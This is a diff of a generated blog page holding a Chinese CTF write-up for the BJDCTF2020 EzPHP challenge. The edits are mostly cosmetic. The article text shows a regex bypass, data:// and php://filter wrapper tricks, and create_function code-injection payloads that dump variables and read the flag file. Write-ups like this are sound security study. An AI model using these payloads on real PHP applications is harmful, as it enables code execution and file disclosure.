@@ -47,7 +47,7 @@ base64解一下，乱码
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -522,12 +522,12 @@ base64解一下，乱码
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -600,8 +600,8 @@ base64解一下，乱码
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[create_function|get_defined_vars|正则绕过]</p>
 <p>写了快半个月的机器人了，摸了好久的鱼，今天重新开始做web！</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160534512.png"></p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160544721.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160534512.png"></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160544721.png"></p>
 <p>base64解一下，乱码</p>
 <p>试试其他的</p>
 <p>最后base32解出来<code>1nD3x.php</code></p>
@@ -665,8 +665,8 @@ base64解一下，乱码
 <pre class="line-numbers language-none"><code class="language-none">debu&#x3D;aqua_is_cute%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="REQUEST-正则绕过"><a href="#REQUEST-正则绕过" class="headerlink" title="$_REQUEST 正则绕过"></a><code>$_REQUEST</code> 正则绕过</h4><p>先GET后POST，可以POST的一个新值绕过</p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191441715-16278164826491.png"></p>
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191457689.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191441715-16278164826491.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191457689.png"></p>
 <p>可见a的值在检测的时候被覆盖了。但实际上没有变。所以只需要在POST里放几个正常参数即可绕过。</p>
 <p>而后面还有shana[]、passwd[]、flag[code]、flag[arg]，这些是数组，不会被正则匹配到，所以不需要加post里</p>
 <h4 id="file-get-contents-file-39-debu-debu-aqua-39"><a href="#file-get-contents-file-39-debu-debu-aqua-39" class="headerlink" title="file_get_contents($file) !== &#39;debu_debu_aqua&#39;"></a><code>file_get_contents($file) !== &#39;debu_debu_aqua&#39;</code></h4><p>就用data伪协议绕过</p>
@@ -676,7 +676,7 @@ base64解一下，乱码
 <pre class="line-numbers language-none"><code class="language-none">shana[]&#x3D;1&amp;passwd[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><code>extract($_GET[&quot;flag&quot;]);</code>，来进行变量覆盖，给下面的$flag和$arg赋值用。</p>
-<p>flag[code]=xxx,flag[arg]=xxx,</p>
+<p>flag[code]&#x3D;xxx,flag[arg]&#x3D;xxx,</p>
 <h4 id="create-function代码注入"><a href="#create-function代码注入" class="headerlink" title="create_function代码注入"></a>create_function代码注入</h4><p><strong>php&lt;7.2</strong></p>
 <p><code>create_function</code>会创建一个匿名函数（<code>lambda</code>样式),然后在内部对第二个参数执行<code>eval()</code></p>
 <p>那如何进行代码注入了？因为他这个是用<strong>字符串拼接</strong>成代码，就类似于sql注入：</p>
@@ -696,7 +696,7 @@ base64解一下，乱码
      <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>构造<code>$b</code>=<code>1);&#125;phpinfo();/*</code>，则函数变为：</p>
+<p>构造<code>$b</code>&#x3D;<code>1);&#125;phpinfo();/*</code>，则函数变为：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 	<span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -714,19 +714,19 @@ base64解一下，乱码
 <span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>于是我构造c=<code>;&#125;phpinfo();/*</code>，函数就变成：</p>
+<p>于是我构造c&#x3D;<code>;&#125;phpinfo();/*</code>，函数就变成：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
 <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>来看题，<code>$code(&#39;&#39;, $arg);</code>很相似</p>
-<p>同理，<code>$code(&#39;&#39;, $arg); </code>，让<code>$code</code>=<code>create_function</code>，就变成</p>
+<p>同理，<code>$code(&#39;&#39;, $arg); </code>，让<code>$code</code>&#x3D;<code>create_function</code>，就变成</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">lambda</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 	<span class="token variable">$arg</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>那只需要arg=<code>;&#125;func();//</code>即可。</p>
+<p>那只需要arg&#x3D;<code>;&#125;func();//</code>即可。</p>
 <p>先整理下</p>
 <pre class="line-numbers language-none"><code class="language-none">第一个：
 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua
@@ -747,12 +747,12 @@ flag[code]&#x3D;create_function
 flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;
 %66%6c%61%67[%61%72%67]&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801225458425.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801225458425.png"></p>
 <p>然后需要读取<code>rea1fl4g.php</code></p>
 <p>1.过滤了include和引号，还可以用require()</p>
 <pre class="line-numbers language-none"><code class="language-none">&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801231507321.png"></p>
+<p><img src="../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801231507321.png"></p>
 <p>buuctf上改了改，把flag给unset了，所以得换种办法</p>
 <p>2.伪协议</p>
 <pre class="line-numbers language-none"><code class="language-none">&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php
@@ -840,12 +840,12 @@ flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -1203,12 +1203,12 @@ flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/thinkphp/">
